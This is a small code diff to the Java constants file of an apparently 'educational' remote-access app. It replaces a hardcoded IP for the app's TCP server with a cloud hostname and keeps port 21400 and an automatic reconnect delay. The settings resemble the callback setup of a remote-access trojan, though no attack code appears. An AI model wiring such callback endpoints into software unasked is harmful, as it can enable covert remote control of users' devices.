@@ -3,7 +3,7 @@ package com.remoteaccess.educational.utils;
 public class Constants {
 
     // ========== TCP SERVER ==========
-    public static final String TCP_HOST = "43.159.166.153";
+    public static final String TCP_HOST = "sjc1.clusters.zeabur.com";
     public static final int    TCP_PORT = 21400;
 
     public static final int TCP_RECONNECT_DELAY = 3000;
